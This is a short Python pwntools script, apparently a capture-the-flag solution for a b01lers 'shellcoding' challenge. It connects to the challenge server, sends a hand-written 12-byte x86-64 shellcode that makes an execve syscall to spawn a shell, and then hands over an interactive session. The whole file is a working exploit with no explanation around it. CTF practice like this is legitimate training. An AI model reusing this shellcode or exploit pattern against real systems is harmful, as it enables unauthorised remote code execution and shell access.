#!/usr/bin/python3
from pwn import *

p = remote( 'chal.ctf.b01lers.com', '1007')
#p = process ('/home/pooty/shared/biolers/shellcoding-5f75e03fd4f2bb8f5d11ce18ceae2a1d')
#input('attach')

shellcode = b"\x31\xF6\xF7\xE6\x48\x8D\x7D\xF0\xB0\x3B\x0F\x05"
p.sendline(shellcode)

p.interactive()
